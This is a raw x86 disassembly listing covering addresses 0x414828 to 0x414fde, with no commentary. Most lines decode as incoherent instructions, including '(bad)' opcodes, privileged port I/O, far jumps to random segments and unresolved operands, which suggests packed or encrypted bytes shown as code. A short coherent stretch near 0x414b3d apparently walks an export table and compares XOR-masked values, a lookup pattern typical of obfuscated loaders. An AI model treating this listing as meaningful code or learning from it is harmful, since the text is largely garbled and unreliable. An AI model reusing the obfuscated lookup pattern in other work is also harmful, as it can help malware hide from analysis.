  414828:	fsub   st,st(1)
  41482a:	(bad)  
  41482b:	shr    ah,cl
  41482d:	dec    ebp
  41482e:	sbb    esi,DWORD PTR [eax-0x2849d7da]
  414834:	inc    ecx
  414835:	lods   al,BYTE PTR ds:[esi]
  414836:	call   DWORD PTR [ebx+0x2b]
  414839:	pop    es
  41483a:	dec    esi
  41483b:	es pop esp
  41483d:	and    esp,DWORD PTR [ecx]
  41483f:	daa    
  414840:	pop    edi
  414841:	mov    al,ds:0x884c25cf
  414846:	or     BYTE PTR [ebx+0x5535f84d],0x8
  41484d:	push   ecx
  41484e:	pop    es
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4148dd
  414861:	pop    ds
  414862:	(bad)  
  414863:	mov    edi,0x707f7d12
  414868:	mov    ecx,0x3d70707e
  41486d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41486e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41486f:	loopne 0x4148de
  414871:	inc    edx
  414872:	mov    al,BYTE PTR [ebx]
  414874:	test   eax,0xf398eef5
  414879:	xor    al,0x9a
  41487b:	jp     0x4148e3
  41487d:	sub    eax,0xed89818
  414882:	pop    ds
  414883:	mov    edi,0xf888ae6
  414888:	cld    
  414889:	and    DWORD PTR [edx-0x4b75c163],edx
  41488f:	lahf   
  414890:	mov    ebx,0x242fcca1
  414895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414896:	mov    eax,ds:0x49bbc26a
  41489b:	push   edx
  41489c:	rcr    BYTE PTR [esi+0x69d37af8],0x1c
  4148a3:	rcl    BYTE PTR [eax+edi*4+0x57],0xd8
  4148a8:	add    BYTE PTR [edi-0x55d92559],ah
  4148ae:	mov    ah,0x9d
  4148b0:	dec    edx
  4148b1:	cmp    al,0x1a
  4148b3:	mov    bh,0x27
  4148b5:	xchg   DWORD PTR [ebp+eiz*8-0x26],edi
  4148b9:	xor    ebx,DWORD PTR ds:0xaed16e57
  4148bf:	sbb    DWORD PTR [ebx-0x4be113f1],ebx
  4148c5:	in     al,dx
  4148c6:	jns    0x414916
  4148c8:	das    
  4148c9:	dec    edx
  4148ca:	pop    ecx
  4148cb:	shr    DWORD PTR ds:0x467fbe3d,1
  4148d1:	cmp    cl,BYTE PTR [esi+0x64]
  4148d4:	pusha  
  4148d5:	push   ds
  4148d6:	fs jbe 0x414908
  4148d9:	mov    ecx,0xeabf48a6
  4148de:	enter  0x6b1a,0x42
  4148e2:	fsubr  DWORD PTR [ebp+0x1e260291]
  4148e8:	push   es
  4148e9:	pusha  
  4148ea:	add    al,0x4c
  4148ec:	mov    cl,0xbd
  4148ee:	popa   
  4148ef:	iret   
  4148f0:	xlat   BYTE PTR ds:[ebx]
  4148f1:	rcl    ebx,0x85
  4148f4:	pushf  
  4148f5:	call   0x6e9:0x4e2873d6
  4148fc:	retf   
  4148fd:	inc    ecx
  4148fe:	sub    BYTE PTR ds:0x4fc6d501,cl
  414904:	mov    cl,0x8d
  414906:	mov    edx,0x24eabc55
  41490b:	xlat   BYTE PTR ds:[ebx]
  41490c:	out    dx,eax
  41490d:	(bad)  
  41490e:	repnz or BYTE PTR [eax],cl
  414911:	push   es
  414912:	mov    ds:0xae8a3491,eax
  414917:	pop    eax
  414918:	mov    edx,0x34ab902d
  41491d:	ficomp WORD PTR [ebp+0x4b]
  414920:	jb     0x41499c
  414922:	hlt    
  414923:	loope  0x414906
  414925:	push   0x32
  414927:	cmp    eax,0xf6c1d554
  41492c:	(bad)  [ebp-0x2234e596]
  414932:	mov    ds:0xea3b4bd4,al
  414937:	outs   dx,DWORD PTR ds:[esi]
  414938:	add    esi,edi
  41493a:	adc    eax,0x78a9b1df
  41493f:	jle    0x4148d6
  414941:	jae    0x414967
  414943:	dec    edx
  414944:	cdq    
  414945:	sbb    eax,0x6b28fea9
  41494a:	inc    ebp
  41494b:	push   ebp
  41494c:	pop    edx
  41494d:	sbb    al,0xa2
  41494f:	rsm    
  414951:	aad    0x94
  414953:	mov    cl,0xb2
  414955:	mov    ch,0x10
  414957:	stos   DWORD PTR es:[edi],eax
  414958:	xor    dl,cl
  41495a:	lods   eax,DWORD PTR ds:[esi]
  41495b:	cmp    BYTE PTR [ecx-0x6718520e],bl
  414961:	pop    ecx
  414962:	and    ebx,0x62
  414965:	and    BYTE PTR [edx-0x32],0xdc
  414969:	fwait
  41496a:	push   0xbf98e839
  41496f:	jns    0x414937
  414971:	(bad)  
  414972:	mov    eax,0x4b77e0e7
  414977:	das    
  414978:	rcl    DWORD PTR [esp+eax*2+0xe],1
  41497c:	lahf   
  41497d:	inc    eax
  41497e:	jbe    0x4149f7
  414980:	test   DWORD PTR [edx+eiz*2-0x46830873],ecx
  414987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414988:	aaa    
  414989:	xor    BYTE PTR [eax+0x2e],0x31
  41498d:	sub    esi,DWORD PTR [ebx]
  41498f:	cmp    eax,edx
  414991:	mov    dh,al
  414993:	test   BYTE PTR [ebx+ebp*4],0x92
  414997:	mul    DWORD PTR [esi+0x2a]
  41499a:	or     DWORD PTR [eax-0x32],esi
  41499d:	xchg   edi,eax
  41499e:	jne    0x4149a0
  4149a0:	pop    esp
  4149a1:	add    al,0x7e
  4149a3:	mov    ds:0x59e21380,eax
  4149a8:	lods   al,BYTE PTR ds:[esi]
  4149a9:	jge    0x414a03
  4149ab:	push   0xffffffb7
  4149ad:	ficomp WORD PTR [edx]
  4149af:	inc    esp
  4149b0:	not    DWORD PTR [ecx+ecx*2+0x490edf70]
  4149b7:	dec    ebp
  4149b8:	mov    ebx,0x9cbb0135
  4149bd:	out    dx,al
  4149be:	into   
  4149bf:	pop    esi
  4149c0:	ret    0x878e
  4149c3:	mul    edi
  4149c5:	sti    
  4149c6:	cli    
  4149c7:	mov    ds:0xa4437899,eax
  4149cc:	inc    ebx
  4149cd:	jmp    0x8a1b:0x8073539b
  4149d4:	gs inc edx
  4149d6:	push   eax
  4149d7:	(bad)  
  4149d8:	sbb    bl,BYTE PTR [ebx+ecx*8+0x682a1915]
  4149df:	dec    edx
  4149e0:	test   al,0xbe
  4149e2:	sahf   
  4149e3:	jno    0x41497f
  4149e5:	push   di
  4149e7:	das    
  4149e8:	out    0xa2,al
  4149ea:	dec    ebx
  4149eb:	adc    ecx,edi
  4149ed:	and    al,0x7
  4149ef:	ja     0x414a19
  4149f1:	sahf   
  4149f2:	mov    al,0x6e
  4149f4:	xchg   ecx,eax
  4149f5:	rcl    BYTE PTR [ebp+edi*1+0x3],0x72
  4149fa:	pop    ebx
  4149fb:	push   esi
  4149fc:	(bad)  
  4149fd:	scas   eax,DWORD PTR es:[edi]
  4149fe:	or     al,0xe2
  414a00:	mov    esp,0x4802f418
  414a05:	xor    al,0xd3
  414a07:	outs   dx,DWORD PTR ds:[esi]
  414a08:	dec    esp
  414a09:	mov    bl,0xec
  414a0b:	out    dx,eax
  414a0c:	stos   DWORD PTR es:[edi],eax
  414a0d:	daa    
  414a0e:	cwde   
  414a0f:	jmp    0x8016:0xbf307fbc
  414a16:	jae    0x41499a
  414a18:	jns    0x414a0f
  414a1a:	xor    DWORD PTR [ebx],edi
  414a1c:	sbb    BYTE PTR [eax-0x27],ch
  414a1f:	xor    ah,bl
  414a21:	inc    ecx
  414a22:	mov    ds:0x68a44304,al
  414a27:	cmp    al,0x67
  414a29:	enter  0xcd21,0x0
  414a2d:	cs fsub st(6),st
  414a30:	pop    edi
  414a31:	call   0x1158:0x2d7f4c8f
  414a38:	fsubr  DWORD PTR [edx-0x57]
  414a3b:	or     cl,0x64
  414a3e:	mov    dh,0xb6
  414a40:	(bad)
  414a43:	stos   DWORD PTR es:[edi],eax
  414a44:	xchg   ecx,eax
  414a45:	stos   DWORD PTR es:[edi],eax
  414a46:	sub    DWORD PTR [eax],esp
  414a48:	jo     0x414ab2
  414a4a:	cli    
  414a4b:	pop    edx
  414a4c:	shl    edx,cl
  414a4e:	hlt    
  414a4f:	(bad)  
  414a50:	int3   
  414a51:	pop    ds
  414a52:	jae    0x414ac6
  414a54:	test   ebp,esp
  414a56:	out    dx,eax
  414a57:	jno    0x414a95
  414a59:	out    dx,al
  414a5a:	inc    esp
  414a5b:	push   0xffffff97
  414a5d:	rcr    BYTE PTR [edx],0xe5
  414a60:	pop    eax
  414a61:	repz cdq 
  414a63:	and    BYTE PTR [ecx],dh
  414a65:	bound  edx,QWORD PTR [edi]
  414a67:	or     DWORD PTR [esi],eax
  414a69:	test   al,bh
  414a6b:	and    DWORD PTR [edi-0x4],ebx
  414a6e:	cdq    
  414a6f:	pop    ebx
  414a70:	popa   
  414a71:	lds    esi,FWORD PTR [ecx+ecx*8]
  414a74:	sbb    BYTE PTR [eax-0x6c],bh
  414a77:	sbb    eax,DWORD PTR [ebp+0x51]
  414a7a:	or     DWORD PTR [esi],ebx
  414a7c:	daa    
  414a7d:	into   
  414a7e:	mov    edx,0x3011a0d4
  414a83:	cmp    BYTE PTR [eax-0x11],ch
  414a86:	xchg   esp,eax
  414a87:	cmp    eax,esi
  414a89:	ins    BYTE PTR es:[edi],dx
  414a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a8b:	sar    bh,0x87
  414a8e:	div    DWORD PTR [ecx+0x5d12b2d2]
  414a94:	arpl   WORD PTR [ebx-0x18],si
  414a97:	shl    BYTE PTR [esi],0xfa
  414a9a:	inc    ecx
  414a9b:	sahf   
  414a9c:	fimul  WORD PTR ds:0x2663f8e6
  414aa2:	fiadd  DWORD PTR [edi+0x15c2dc77]
  414aa8:	mov    edi,0x68e7ca05
  414aad:	pop    es
  414aae:	mov    WORD PTR [ecx-0x7a],gs
  414ab1:	test   DWORD PTR [esi],ecx
  414ab3:	jp     0x414a40
  414ab5:	push   ds
  414ab6:	sbb    ebp,0x63
  414ab9:	in     al,dx
  414aba:	cmp    eax,0x252637f6
  414abf:	and    DWORD PTR [ebx],esi
  414ac1:	jb     0x414b22
  414ac3:	jmp    DWORD PTR ds:0xf98c28d4
  414ac9:	inc    ebp
  414aca:	in     eax,0x4c
  414acc:	les    ebx,FWORD PTR [eax+0xc8b9a0d]
  414ad2:	adc    BYTE PTR [ecx+ebx*8],dl
  414ad5:	add    al,0x78
  414ad7:	cwde   
  414ad8:	lds    esp,FWORD PTR [edx-0x73]
  414adb:	mov    esp,0x4154f6fb
  414ae0:	xchg   DWORD PTR [edx-0x6ec9d46e],ebx
  414ae6:	and    al,0x5a
  414ae8:	retf   
  414ae9:	fdiv   st,st(3)
  414aeb:	fcmovnbe st,st(7)
  414aed:	pop    ss
  414aee:	cdq    
  414aef:	js     0x414b3d
  414af1:	pusha  
  414af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414af3:	inc    ebp
  414af4:	lock not BYTE PTR [edx]
  414af7:	loope  0x414a89
  414af9:	inc    edi
  414afa:	or     al,0xa0
  414afc:	dec    esi
  414afd:	push   ebx
  414afe:	jne    0x414a81
  414b00:	sbb    DWORD PTR [edi+eiz*4],esp
  414b03:	bound  ecx,QWORD PTR [eax-0x35]
  414b06:	xor    al,0x5f
  414b08:	mov    ebx,0xb8c2968a
  414b0d:	mov    dl,0xde
  414b0f:	sub    dl,bl
  414b11:	pop    ebp
  414b12:	dec    eax
  414b13:	sbb    al,ch
  414b15:	std    
  414b16:	mov    edx,ebp
  414b18:	jge    0x414acf
  414b1a:	cwde   
  414b1b:	idiv   DWORD PTR [ecx]
  414b1d:	mov    ch,0x79
  414b1f:	je     0x414b1a
  414b21:	pushf  
  414b22:	jmp    0xfe591c6a
  414b27:	ret    0x78ba
  414b2a:	in     al,0xdc
  414b2c:	sbb    DWORD PTR [eax-0x21e51d40],esp
  414b32:	inc    ebp
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	outs   dx,DWORD PTR ds:[esi]
  414bb7:	sbb    al,0x54
  414bb9:	or     ebx,DWORD PTR [ebx+0x7b]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0x8470707e
  414bc3:	jl     0x414c17
  414bc5:	jle    0x414ba9
  414bc7:	jbe    0x414bd4
  414bc9:	in     al,dx
  414bca:	out    dx,eax
  414bcb:	test   BYTE PTR [ebp+0xb],cl
  414bce:	xchg   ebp,eax
  414bcf:	mov    ds:0x80ab8bd7,al
  414bd4:	repnz stos DWORD PTR es:[edi],eax
  414bd6:	mov    ah,0x28
  414bd8:	out    0xee,al
  414bda:	je     0x414c21
  414bdc:	and    BYTE PTR [ebp+0x73],bh
  414bdf:	shl    ebx,cl
  414be1:	dec    edx
  414be2:	clc    
  414be3:	mov    ecx,0xfb45883b
  414be8:	lahf   
  414be9:	out    dx,al
  414bea:	jne    0x414b70
  414bec:	fldenv [edx+eiz*1]
  414bef:	push   cs
  414bf0:	adc    al,0x33
  414bf2:	fs push ebx
  414bf4:	sti    
  414bf5:	cmp    edi,0xfd482503
  414bfb:	push   cs
  414bfc:	cmc    
  414bfd:	mov    dl,0x7d
  414bff:	test   ebx,edx
  414c01:	push   ebp
  414c02:	xlat   BYTE PTR ds:[ebx]
  414c03:	les    eax,FWORD PTR [ebp-0x6f]
  414c06:	mov    bl,0x7f
  414c08:	sub    ebx,ebx
  414c0a:	sub    DWORD PTR [esi],edx
  414c0c:	sub    ebp,0xb433d8f3
  414c12:	jge    0x414bdc
  414c14:	lods   eax,DWORD PTR ds:[esi]
  414c15:	jle    0x414be2
  414c17:	retf   0x9832
  414c1a:	mov    ds:0x70192085,al
  414c1f:	xlat   BYTE PTR ds:[ebx]
  414c20:	sbb    dl,al
  414c22:	xchg   esi,eax
  414c23:	or     al,0xb
  414c25:	je     0x414baa
  414c27:	(bad)  
  414c28:	cmp    DWORD PTR [edx+ecx*8],ecx
  414c2b:	dec    edi
  414c2c:	int    0x30
  414c2e:	and    al,0x4d
  414c30:	ja     0x414c2e
  414c32:	inc    edx
  414c33:	in     al,dx
  414c34:	inc    edx
  414c35:	fidiv  WORD PTR [ebp+0x4d]
  414c38:	into   
  414c39:	(bad)  
  414c3a:	jmp    0x414be9
  414c3c:	cli    
  414c3d:	fisttp WORD PTR [ecx-0x559a2543]
  414c43:	clc    
  414c44:	jmp    0xafaf0142
  414c49:	fist   DWORD PTR [edi-0x21255ee5]
  414c4f:	add    esp,DWORD PTR [ecx]
  414c51:	mov    eax,0xcded98d3
  414c56:	aad    0x7
  414c58:	out    dx,al
  414c59:	pop    es
  414c5a:	imul   esp,esi,0xfffffff7
  414c5d:	fistp  DWORD PTR [edx+0x42]
  414c60:	fdivr  DWORD PTR [ecx+edx*1]
  414c63:	dec    esp
  414c64:	or     ecx,DWORD PTR [esi+0x4134aacb]
  414c6a:	nop
  414c6b:	fdiv   QWORD PTR [edi+0x54]
  414c6e:	addr16 jp 0x414c73
  414c71:	(bad)  
  414c72:	jno    0x414c05
  414c74:	push   edi
  414c75:	outs   dx,DWORD PTR ds:[esi]
  414c76:	cmp    esp,ebp
  414c78:	dec    ebx
  414c79:	ret    
  414c7a:	and    dh,BYTE PTR [edx+0x3c67454f]
  414c80:	fidivr WORD PTR [esi+0x74]
  414c83:	dec    edi
  414c84:	mov    ds:0xe51915c0,al
  414c89:	adc    BYTE PTR ds:0x87894c0,dh
  414c8f:	sbb    edi,DWORD PTR [esi-0x3b3b1619]
  414c95:	xchg   esp,eax
  414c96:	aaa    
  414c97:	mov    eax,0x2bde520f
  414c9c:	imul   esp,edx,0xa143cff6
  414ca2:	sub    al,0x17
  414ca4:	xor    esi,DWORD PTR [edx]
  414ca6:	mov    DWORD PTR [eax-0x1a427dfd],0x4d7b69e6
  414cb0:	out    0x56,eax
  414cb2:	jo     0x414cd3
  414cb4:	cmp    bl,dh
  414cb6:	xchg   ebx,eax
  414cb7:	test   eax,0x5de06bac
  414cbc:	das    
  414cbd:	sub    eax,0x699d8d4b
  414cc2:	call   0x83830488
  414cc7:	adc    BYTE PTR [edx-0x17b755eb],ch
  414ccd:	mov    bl,BYTE PTR [ebx-0x304f2853]
  414cd3:	xchg   bl,bl
  414cd5:	cmpxchg DWORD PTR [esi+eax*1+0x19],ecx
  414cda:	inc    eax
  414cdb:	xchg   ecx,eax
  414cdc:	or     dl,BYTE PTR [edx+ebp*8]
  414cdf:	rol    DWORD PTR [esi+0x4aa198a3],0xb1
  414ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce7:	mov    ah,0x98
  414ce9:	jnp    0x414c99
  414ceb:	push   edi
  414cec:	sbb    BYTE PTR [ebp+0x25],al
  414cef:	jo     0x414c76
  414cf1:	pop    ecx
  414cf2:	repz sti 
  414cf4:	mov    edx,0xe88749bf
  414cf9:	arpl   WORD PTR ds:0xc2f93d9,cx
  414cff:	rcl    BYTE PTR [edx-0x20],cl
  414d02:	out    0x6,al
  414d04:	xchg   esp,eax
  414d05:	or     eax,0x19359ed4
  414d0a:	es stos DWORD PTR es:[edi],eax
  414d0c:	test   al,0x9b
  414d0e:	add    al,BYTE PTR [eax+ebx*4]
  414d11:	xor    DWORD PTR [ebp+0x1ba87dba],0xffffffa6
  414d18:	add    DWORD PTR [eax+0x662fb94b],0xeba21e8d
  414d22:	(bad)  
  414d23:	ds inc edi
  414d25:	push   cs
  414d26:	push   esi
  414d27:	lock dec esi
  414d29:	int    0xd7
  414d2b:	ffreep st(3)
  414d2d:	enter  0xdf4f,0x30
  414d31:	cli    
  414d32:	cmp    eax,DWORD PTR [ebx-0x5f]
  414d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d36:	and    ecx,esp
  414d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d39:	dec    edi
  414d3a:	stos   DWORD PTR es:[edi],eax
  414d3b:	mov    esi,0x272895c2
  414d40:	mov    al,0xc
  414d42:	pop    ebp
  414d43:	aas    
  414d44:	dec    edi
  414d45:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414d47:	test   eax,0xa1e9bc58
  414d4c:	hlt    
  414d4d:	ficom  WORD PTR [edi-0x79cb5e3a]
  414d53:	fldcw  WORD PTR [esi+ebx*2+0x2e]
  414d57:	xor    BYTE PTR [edi],bh
  414d59:	and    al,0x40
  414d5b:	xchg   ebx,eax
  414d5c:	cmc    
  414d5d:	dec    esp
  414d5e:	es push cs
  414d60:	test   al,0xd0
  414d62:	inc    edi
  414d63:	loope  0x414cf0
  414d65:	xor    ebx,DWORD PTR [eax]
  414d67:	cmp    ebp,DWORD PTR [ebp+eiz*1-0x90283cf]
  414d6e:	dec    esp
  414d6f:	mov    eax,0x58d516fe
  414d74:	sbb    eax,0x6bedd404
  414d79:	push   ebp
  414d7a:	xchg   ebp,eax
  414d7b:	push   edx
  414d7c:	inc    ebx
  414d7d:	popf   
  414d7e:	mov    gs,WORD PTR [ecx-0x46]
  414d81:	or     al,BYTE PTR [edx]
  414d83:	shl    BYTE PTR [esi-0x6d],cl
  414d86:	sbb    BYTE PTR [esp+edx*8],cl
  414d89:	pop    edx
  414d8a:	test   BYTE PTR [edx],bh
  414d8c:	or     DWORD PTR [edi-0x1c743d6d],ebp
  414d92:	fistp  DWORD PTR [eax+0x50]
  414d95:	mov    bh,0xe6
  414d97:	cmp    BYTE PTR [ebp-0xc],cl
  414d9a:	push   es
  414d9b:	and    al,0x97
  414d9d:	xchg   esi,eax
  414d9e:	nop
  414d9f:	xchg   ecx,eax
  414da0:	loop   0x414d8f
  414da2:	loopne 0x414d89
  414da4:	mov    ds:0x4b0fa744,eax
  414da9:	fnstcw WORD PTR [ecx-0x4b042205]
  414daf:	sti    
  414db0:	push   ds
  414db1:	fistp  DWORD PTR [ebp+edi*1+0x41]
  414db5:	sub    ecx,DWORD PTR [edi+0x1898ad93]
  414dbb:	cld    
  414dbc:	sub    esi,0xffffffbc
  414dbf:	icebp  
  414dc0:	fwait
  414dc1:	xchg   ebx,eax
  414dc2:	aas    
  414dc3:	data16 cmp dl,BYTE PTR [edx]
  414dc6:	xor    BYTE PTR [ebx+0x17],al
  414dc9:	or     al,0xbf
  414dcb:	cmp    cl,BYTE PTR [ecx+esi*2+0x2a]
  414dcf:	jmp    0x414e30
  414dd1:	sub    cl,al
  414dd3:	fidiv  DWORD PTR [edx+0x5]
  414dd6:	cmc    
  414dd7:	jg     0x414e4f
  414dd9:	enter  0x8530,0x64
  414ddd:	adc    eax,0xaf883d9a
  414de2:	sbb    ebx,DWORD PTR [eax-0x3ebd7e19]
  414de8:	or     al,0x48
  414dea:	adc    eax,0xd38cb711
  414def:	test   ecx,0x4bb85d65
  414df5:	pop    eax
  414df6:	retf   0x6c7e
  414df9:	out    0xb4,eax
  414dfb:	mov    edx,0x91e6fcbe
  414e00:	call   FWORD PTR [ebp-0x3f]
  414e03:	ror    BYTE PTR [edx],cl
  414e05:	cld    
  414e06:	jae    0x414e4a
  414e08:	pop    ecx
  414e09:	mov    DWORD PTR [ecx],ecx
  414e0b:	jae    0x414db7
  414e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e0e:	test   DWORD PTR [edi+0x78],ebx
  414e11:	rcr    BYTE PTR [ecx-0x66ad3b87],1
  414e17:	jno    0x414e6f
  414e19:	xchg   DWORD PTR [ebx],ebp
  414e1b:	out    0x45,eax
  414e1d:	loope  0x414de0
  414e1f:	mov    bl,dh
  414e21:	imul   eax,DWORD PTR [eax],0x1f043809
  414e27:	loopne 0x414e4b
  414e29:	cmp    DWORD PTR [edx-0x15c54a27],eax
  414e2f:	and    edi,DWORD PTR [ecx]
  414e31:	sub    eax,0x9cd8511e
  414e36:	das    
  414e37:	and    BYTE PTR [eax+0x6c],ch
  414e3a:	add    eax,0x78694efc
  414e3f:	xor    BYTE PTR [edx-0x7],ah
  414e42:	or     eax,0x4936bd01
  414e47:	mov    cs:0xf4eb4c23,al
  414e4d:	jecxz  0x414e65
  414e4f:	sbb    cl,BYTE PTR [ebx]
  414e51:	jecxz  0x414e60
  414e53:	enter  0x3268,0xd6
  414e57:	fs and al,0x65
  414e5a:	fisttp DWORD PTR [ebx+0x67]
  414e5d:	jl     0x414e9c
  414e5f:	sub    eax,0xbc201090
  414e64:	add    al,0x89
  414e66:	push   edx
  414e67:	pop    ebx
  414e68:	aad    0xc9
  414e6a:	xor    edx,DWORD PTR [ecx+0x2a]
  414e6d:	sbb    BYTE PTR [ebx],dl
  414e6f:	dec    eax
  414e70:	nop
  414e71:	jmp    0x414e51
  414e73:	jnp    0x414eba
  414e75:	loopne 0x414e61
  414e77:	sub    DWORD PTR [eax+esi*4-0x3d],eax
  414e7b:	mov    ecx,0xa7ad9ee5
  414e80:	fcomp  DWORD PTR [edx-0x3d]
  414e83:	das    
  414e84:	mov    dl,BYTE PTR [edx+0x590206c5]
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	mov    bl,0x23
  414eae:	adc    BYTE PTR [ecx],bh
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e55
  414eb9:	(bad)  
  414eba:	mov    eax,0xc6929800
  414ebf:	or     DWORD PTR [eax-0x13f0ac2d],edx
  414ec5:	sbb    BYTE PTR [edi+0x5f],ch
  414ec8:	hlt    
  414ec9:	mov    ah,0x36
  414ecb:	outs   dx,DWORD PTR ds:[esi]
  414ecc:	cdq    
  414ecd:	out    0x85,al
  414ecf:	push   0x61
  414ed1:	cmp    al,0x82
  414ed3:	fisub  DWORD PTR [edx+0x4c6034ea]
  414ed9:	push   ecx
  414eda:	xchg   edx,eax
  414edb:	pop    es
  414edc:	out    dx,eax
  414edd:	xor    al,0xc2
  414edf:	(bad)  
  414ee0:	fucomip st,st(5)
  414ee2:	mul    DWORD PTR [ebp+edi*4+0x2f]
  414ee6:	and    ah,al
  414ee8:	push   0xffffff96
  414eea:	and    eax,0xeffe3274
  414eef:	add    eax,ecx
  414ef1:	adc    edx,DWORD PTR [ecx]
  414ef3:	in     al,dx
  414ef4:	leave  
  414ef5:	or     ah,ch
  414ef7:	pop    eax
  414ef8:	gs pushf 
  414efa:	int3   
  414efb:	and    eax,0xe99ae70c
  414f00:	aas    
  414f01:	add    DWORD PTR [esi-0xb7c668],0xffffffd3
  414f08:	or     esp,esp
  414f0a:	cmc    
  414f0b:	js     0x414ec0
  414f0d:	test   DWORD PTR [edx+0xc],ebp
  414f10:	in     al,dx
  414f11:	pop    edx
  414f12:	or     DWORD PTR [edx+0x47b0ece8],esi
  414f18:	int    0xef
  414f1a:	dec    ecx
  414f1b:	faddp  st(2),st
  414f1d:	cwde   
  414f1e:	push   eax
  414f1f:	xchg   ecx,eax
  414f20:	and    DWORD PTR [eax],ebp
  414f22:	int3   
  414f23:	addr16 cli 
  414f25:	sub    BYTE PTR [edi+0x3e623d78],cl
  414f2b:	and    esp,DWORD PTR [eax+0x4c51bbf7]
  414f31:	mov    ds:0xa0fff73d,al
  414f36:	ja     0x414f1a
  414f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f39:	mov    esi,0x1e660b04
  414f3e:	fild   WORD PTR [ebp+0x3]
  414f41:	fnstenv [edi-0x6dcfd3da]
  414f47:	mov    ?,WORD PTR [ebp-0xa]
  414f4a:	cmp    DWORD PTR [ecx-0x67],ebx
  414f4d:	hlt    
  414f4e:	imul   eax,DWORD PTR [esi],0x35
  414f51:	mov    ch,0xed
  414f53:	dec    esi
  414f54:	imul   ebx,DWORD PTR [eax+ebp*4+0x2f],0x3b73b75c
  414f5c:	iret   
  414f5d:	inc    edi
  414f5e:	and    BYTE PTR [eax-0x53a5dba1],ah
  414f64:	lds    esi,FWORD PTR [ecx]
  414f66:	jnp    0x414f3b
  414f68:	xlat   BYTE PTR ds:[ebx]
  414f69:	sbb    eax,0xaa09ac9f
  414f6e:	add    eax,0x91b7f47a
  414f73:	aam    0x8d
  414f75:	mov    eax,0x87fe9383
  414f7a:	mov    ?,WORD PTR [esi]
  414f7c:	test   DWORD PTR [eax],esi
  414f7e:	or     al,BYTE PTR [ecx+0x4813ca97]
  414f84:	mov    ah,0xe2
  414f86:	mov    dl,0x6b
  414f88:	retf   
  414f89:	aas    
  414f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f8b:	xor    BYTE PTR [ebx-0x61fd3a0b],ch
  414f91:	pop    es
  414f92:	xor    eax,0xdef40e3f
  414f97:	mov    bl,0x4
  414f99:	sub    al,0xe3
  414f9b:	mov    edx,0x99543ae0
  414fa0:	mov    eax,0xcddbbf9a
  414fa5:	xor    eax,0x83287c2f
  414faa:	push   edi
  414fab:	and    esp,esi
  414fad:	mov    edx,0x6c9faf42
  414fb2:	int    0xf4
  414fb4:	push   ebp
  414fb5:	sahf   
  414fb6:	rcl    DWORD PTR [eax+edx*2+0x29],cl
  414fba:	pop    es
  414fbb:	add    eax,0xb7c89886
  414fc0:	xchg   DWORD PTR [edi+0x11d6284b],ebp
  414fc6:	inc    ecx
  414fc7:	fistp  DWORD PTR [ebx-0x2]
  414fca:	scas   eax,DWORD PTR es:[edi]
  414fcb:	or     DWORD PTR [esi],ebp
  414fcd:	bound  eax,QWORD PTR [eax+0x78]
  414fd0:	sahf   
  414fd1:	adc    eax,0x7c1507eb
  414fd6:	sbb    DWORD PTR ds:0x3cfccd67,esp
  414fdc:	aam    0x35
  414fde:	imul   ecx,DWORD PTR [ecx+0x43],0xd36db680
